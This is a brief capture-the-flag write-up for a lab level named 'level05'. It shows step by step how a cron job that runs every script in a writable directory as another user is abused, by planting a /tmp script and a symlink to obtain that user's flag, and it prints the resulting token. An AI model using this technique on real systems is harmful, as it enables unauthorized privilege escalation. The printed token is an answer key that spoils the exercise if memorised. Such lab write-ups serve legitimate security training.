# level05

- We have received a mail with a crontab in it `$ cat /var/mail/level05`

- The crontab execute the script `/usr/sbin/openarenaserver` as flag05 every 2 minutes

- The scipt execute everything in `/opt/openarenaserver`

- We create a script in `/tmp` (`$ vi /tmp/getflag.sh`)
    > #!/bin/bash
    > /bin/getflag > /tmp/flag

- We set it as executable `$ chmod +x /tmp/getflag.sh`

- We create a symbolique link in `/opt/openarenaserver` and we wait 2 min

- `$ cat /tmp/flag`
    > Check flag.Here is your token : viuaaale9huek52boumoomioc

